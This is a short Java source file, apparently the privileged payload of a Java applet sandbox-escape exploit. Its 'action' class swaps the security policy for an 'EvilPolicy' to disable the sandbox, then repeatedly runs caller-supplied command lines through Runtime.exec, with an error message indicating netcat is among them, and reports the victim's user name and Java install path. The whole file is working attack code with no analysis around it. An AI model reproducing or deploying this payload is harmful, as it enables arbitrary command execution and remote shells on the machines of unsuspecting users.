import java.io.PrintStream;
import java.security.Policy;
import java.security.PrivilegedAction;

public class action
  implements PrivilegedAction
{
  String[][] cmds = null;

  public Object run()
  {
    System.out.println("WP> Running code with privileges (your user name: " + System.getProperty("user.name") + ")");
    try
    {
      Policy.setPolicy(new EvilPolicy());
      System.out.println("WP> Replaced policy");
    } catch (SecurityException ex) {
      System.out.println("WP> Failed to replace policy, caught " + ex);
    }

    if (this.cmds != null) {
      int ret = 0;
      while (ret != 42)
        try {
          for (int i = 0; ; i++) {
            String[] cmdline = this.cmds[i];
            System.out.println("WP> execing " + cmdline[0]);
            Process p = Runtime.getRuntime().exec(cmdline);
            ret = p.waitFor();
          }
        } catch (ArrayIndexOutOfBoundsException localArrayIndexOutOfBoundsException) {
        } catch (Exception ex) {
          System.out.println("WP> exec netcat failed, caught" + ex);
        }
    }
    String rets = System.getProperty("user.name") + " (java lives in:" + System.getProperty("java.home") + ")";
    return rets;
  }

  public action(String[][] pcmds) {
    this.cmds = pcmds;
  }
}